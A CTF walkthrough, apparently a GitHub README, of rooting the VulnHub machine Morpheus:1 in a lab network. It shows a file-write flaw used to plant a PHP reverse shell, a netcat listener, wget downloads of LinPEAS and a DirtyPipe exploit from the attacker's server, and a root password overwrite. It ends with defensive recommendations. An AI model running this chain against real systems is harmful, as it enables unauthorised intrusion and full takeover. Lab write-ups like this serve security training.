<h1 align="center">🐧 Morpheus:1 — Penetration Testing Walkthrough</h1>
<h3 align="center">From Reconnaissance to Root Access — A Complete CTF Guide</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
  <img src="https://img.shields.io/badge/Platform-VulnHub-purple" alt="Platform">
</p>

> **Attacker IP:** `192.168.56.12` &nbsp;·&nbsp; **Target IP:** `192.168.56.18`

---

## 📖 Table of Contents
- [Overview](#-overview)
- [Objectives](#-objectives)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration](#2-web-enumeration)
- [3. Exploitation — From Graffiti to Shell](#3-exploitation--from-graffiti-to-shell)
- [4. Privilege Escalation](#4-privilege-escalation)
- [5. Capturing the Final Flag](#5-capturing-the-final-flag)
- [6. Summary of Attack Chain](#6-summary-of-attack-chain)
- [Key Takeaways](#-key-takeaways)
- [Security Recommendations](#-security-recommendations)
- [Tools Used](#-tools-used)

---

## 📋 Overview
This guide documents the complete penetration testing methodology for **Morpheus:1**, detailing every step from initial reconnaissance to privilege escalation and flag capture. The box hinges on an arbitrary file-write vulnerability in a web message board, chained into a kernel-level privilege escalation via **DirtyPipe (CVE-2022-0847)**.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate web content and hidden functionality
- Exploit a file-write vulnerability to gain a foothold
- Escalate privileges using a kernel exploit
- Capture both flags

---

## 1. Reconnaissance

### 🌐 Host Discovery
After bringing the VM online, confirm the attacker interface, then sweep the lab network for live hosts.

```bash
$ ifconfig
# eth0: inet 192.168.56.12

$ nmap -sn 192.168.56.0/24
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s1.png" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s2.png" width="600"/>
</p>

The scan reveals the target at **`192.168.56.18`** (Oracle VirtualBox virtual NIC).

### 🛰️ Service Enumeration
An aggressive Nmap scan maps the attack surface.

```bash
$ nmap -A 192.168.56.18
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s3.png" width="600"/>
</p>

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian 5 (protocol 2.0) |
| 80/tcp | HTTP | Apache httpd 2.4.51 (Debian) |
| 81/tcp | HTTP | nginx 1.18.0 (Basic Auth required) |

The web server on port 80 returns a *Matrix*-themed Boot2Root landing page:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s4.png" width="600"/>
</p>

Port 81 presents an HTTP Basic Auth dialog (`realm="Meeting Place"`), noted for later:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s5.png" width="600"/>
</p>

We navigate to http:/192.168.56.18/robots.txt and get the result below.
`/robots.txt` returns a taunt: *"There's no white rabbit here. Keep searching!"*

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s6.png" width="600"/>
</p>

---

## 2. Web Enumeration

### 📂 Content Discovery
**Gobuster** brute-forces directories and files on port 80.

```bash
$ gobuster dir -u http://192.168.56.18 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .php,.txt,.html
```

**Notable findings:** `/index.html` · `/1.php` · `/info.php` · `/test.php` · `/javascript/` · `/robots.txt` · `/alien.php` · `/graffiti.txt` · `/graffiti.php` · `/server-status` (403 Forbidden)


<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s7.png" width="600"/>
</p>
---

### 🖍️ The Graffiti Wall
`/graffiti.php` loads a message board titled **"Nebuchadnezzar Graffiti Wall."** It lets users post messages, which are then written to `/graffiti.txt` and displayed on the page — an immediate candidate for a **file-write / path-traversal** vulnerability.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s8.png" width="600"/>
</p>

---

#### Graffiti.txt

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s9.png" width="600"/>
</p>
---

## 3. Exploitation — From Graffiti to Shell

### 🕸️ Proxy Setup
Route Firefox through **Burp Suite** to inspect the graffiti form submission:

1. **Firefox and click the three lines on the right**

 <p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s10.png" width="600"/>
</p>
---

2. **The panel opens and select settings**

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s11.png" width="600"/>
</p>
---

3. **Scroll down to Network Settings and select settings**

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s12.png" width="600"/>
</p>
---


4. Select **Manual proxy configuration**

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s13.png"  width="600"/>
</p>
---

5. Set **HTTP Proxy** to `127.0.0.1:8080` with **"Also use this proxy for HTTPS"** checked

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s14.png"  width="600"/>
</p>
---

6. In **Burp Suite click Proxy**
  
<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s15.png" width="600"/>
</p>
---

7.   **Proxy settings, confirm the listener on `127.0.0.1:8080`**

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s16.png" width="600"/>
</p>
---

8. Turn **Intercept ON**

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s17.png" width="600"/>
</p>
---

### 🎯 Intercepting the Request
Submitting a test message on the graffiti wall. "to be intercepted"

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s18.png" width="600"/>
</p>
---

Before proceeding, go to the web browser and search for 'php reverse shell'. Click pentest monkey on github.
hen copy paste the whole php code as we will use it in the next step.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s19.png" width="600"/>
</p>
---

Now you click "post" on the graffiti.php webpage to be intercepted by Burpsuite.
Burp intercepts the POST request:

```http
POST /graffiti.php HTTP/1.1
Host: 192.168.56.18
...
Content-Type: application/x-www-form-urlencoded

message=to+be+intercepted+by+burp&file=graffiti.txt
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s20.png" width="600"/>
</p>
---

### 🐚 Weaponizing the File Write

On the parameter 'message=' erase the message and paste the php code from pentest monkey repo.
Grab **pentestmonkey's PHP reverse shell** and edit the top variables to point back to the attacker machine:

```php
$ip = '192.168.56.12';   // CHANGE THIS
$port = 7777;            // CHANGE THIS
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s21.png" width="600"/>
</p>
---

The `file` parameter controls the destination filename — meaning it's possible to write to **any** file the web server has permission to touch, including `.php` files in the web root.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s22.png" width="600"/>
</p>
---

Send the intercepted graffiti POST to **Repeater** 

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s23.png" width="600"/>
</p>
---

(`Ctrl+R`), replace the message body with the full reverse shell payload, and change the `file` parameter from `graffiti.txt` to **`intercept.php`**:

```http
POST /graffiti.php HTTP/1.1
...

message=<?php ... // php-reverse-shell payload ... ?>&file=intercept.php
```

Clicking **Send** returns **`HTTP/1.1 200 OK`** — the shell has been written to `/intercept.php`.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s24.png" width="600"/>
</p>


### 📡 Catching the Shell
Start a netcat listener on the attacker machine:

```bash
$ nc -lvnp 7777
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s25.png" width="600"/>
</p>
---

Visiting `http://192.168.56.18/intercept.php` in the browser hangs the page — and the listener lights up:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s27.png" width="600"/>
</p>
---

```
connect to [192.168.56.12] from (UNKNOWN) [192.168.56.18] 37650
Linux morpheus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A quick look around the filesystem reveals the first flag sitting in the root of the web tree:

```bash
www-data@morpheus:/$ ls /
www-data@morpheus:/$ cat FLAG.txt
Flag 1!
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s28.png" width="600"/>
</p>
---

## 4. Privilege Escalation

### 🔎 Post-Exploitation Recon
With a low-privilege shell as `www-data`, run **LinPEAS** to automate enumeration of misconfigurations and known CVEs.

> **Note:** When moving files from the attacker VM to the vulnerable machine, `cd /tmp` first — it's universally writable and the safest place to stage payloads without triggering permission errors or leaving obvious artifacts in user directories.

```bash
www-data@morpheus:/$ cd /tmp

```
---
<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s29.png" width="600"/>
</p>
---
On the attacking machine, open the directory with linepeas and open the terminal there.
Then execute the following command

```bash
$ python -m http.server 5678
```
--- 

Perform the following command on the morpheus terminal to copy the file to the /tmp folder.

```bash
www-data@morpheus:/tmp$ wget http://192.168.56.12:5678/linpeas1.sh
www-data@morpheus:/tmp$ chmod +x linpeas1.sh
www-data@morpheus:/tmp$ ./linpeas1.sh
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s30.png" width="600"/>
</p>
---

LinPEAS flags several kernel CVEs — the most critical being **CVE-2022-0847 (DirtyPipe)**.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s31.png" width="600"/>
</p>
---

### 🩸 DirtyPipe (CVE-2022-0847)
DirtyPipe is a Linux kernel vulnerability allowing unprivileged users to overwrite arbitrary files in read-only mounts — most notably `/etc/passwd` — by exploiting a flaw in the pipe buffer code. The target runs a vulnerable kernel (`5.10.70`), making this a direct shoot to root.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s32.png" width="600"/>
</p>

---

Clone the public exploit repository (on the attacker VM):

```bash
$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```

The repository includes a `compile.sh` script. The original script produces dynamically-linked binaries — but **this VulnHub machine lacks the shared libraries needed to run standard compiled executables** — so `compile.sh` we edit to use **`gcc -static`** for static linking, baking all dependencies into the binary and making it portable to the target.

```bash
# Edited compile.sh
$ gcc -static exploit1.c -o exploit-9
$ gcc -static exploit2.c -o exploit-6
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s33.png" width="600"/>
</p>
---

Serve the compiled binaries via a Python HTTP server from the attacker VM:

```bash
$ python3 -m http.server 5678
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s34.png" width="600"/>
</p>
---

Pull them down to the target (again, from `/tmp`):

```bash
www-data@morpheus:/tmp$ wget http://192.168.56.12:5678/exploit-9
www-data@morpheus:/tmp$ chmod +x exploit-9
www-data@morpheus:/tmp$ ./exploit-9
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s35.png" width="600"/>
</p>
---

The exploit executes flawlessly:

```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
```
<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s36.png" width="600"/>
</p>
---

System() function failed because we do not have a stable terminal. Let's launch a stable terminal.

### 🏁 Becoming Root
With the root password now set to **`piped`**, switch users:
Spawn a proper TTY for stability:

```bash
www-data@morpheus:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@morpheus:/$ su root
Password: piped
root@morpheus:/# whoami
root
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s37.png"
</p>
---

## 5. Capturing the Final Flag

With root access secured, navigate to `/root` and claim the prize:

```bash
root@morpheus:/# cd /root
root@morpheus:/root# ls
FLAG.txt
root@morpheus:/root# cat FLAG.txt
You've won!

Let's hope Matrix: Resurrections rocks!
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Morpheus/main/Screenshots/s38.png" width="600"/>
</p>
---
🎉 **Root access achieved — both flags captured!**

## 6. Summary of Attack Chain

| Phase | Technique | Tool / Payload |
|-------|-----------|----------------|
| Recon | Network & service scan | `nmap -sn`, `nmap -A` |
| Enumeration | Directory brute-force | `gobuster` |
| Exploitation | File-write via `file` parameter | Burp Suite + PHP reverse shell |
| Initial Access | Reverse shell callback | `nc -lvnp 7777` |
| Post-Exploitation | Automated privesc enumeration | `linpeas.sh` |
| Privilege Escalation | Kernel exploit (DirtyPipe) | `CVE-2022-0847` static binary |
| Root Access | Password overwrite + `su` | Custom-compiled `exploit-9` |

---

## 🔑 Key Takeaways

1. **Always use `gcc -static`** when compiling exploits for unknown target environments — dynamically-linked binaries often fail on stripped-down VMs lacking standard libraries.
2. **Stage files in `/tmp`** when transferring payloads to a compromised host — it avoids permission issues and keeps the workflow clean.
3. **Intercept everything.** The graffiti wall looked benign until Burp revealed the `file` parameter — a clear example of why proxying all traffic matters.
4. **Kernel version is king.** LinPEAS plus a quick CVE check turned a potentially long privesc hunt into a single-exploit root.

---

## 🔒 Security Recommendations

- **Input Validation** — Never let user input control a filename or file path server-side; the `file` parameter on the graffiti wall should be hardcoded, not client-supplied
- **File Upload/Write Restrictions** — Restrict the web server process from writing files with executable extensions (`.php`, `.cgi`, etc.) into web-servable directories
- **Kernel Patch Management** — Keep kernels current; DirtyPipe (CVE-2022-0847) was patched shortly after disclosure and this box remained vulnerable
- **Least Privilege** — Run web application processes (`www-data`) with the minimum filesystem permissions necessary
- **Log Monitoring** — Alert on unexpected file writes to the web root and unusual outbound connections (e.g. reverse shell callbacks)

---

## 🔧 Tools Used

**🛡️ Network & Service Discovery**
`ifconfig` · `nmap` · `gobuster`

**🔓 Exploitation**
Burp Suite · PHP reverse shell (pentestmonkey) · `netcat`

**🔍 Information Gathering**
`linpeas.sh` · `cat` · `ls`

**💻 Privilege Escalation**
`gcc -static` · CVE-2022-0847 (DirtyPipe) · `su`

---

<p align="center">
  <strong>Documentation created for educational purposes</strong><br>
  All techniques should be practiced only in controlled, authorized environments.
</p>
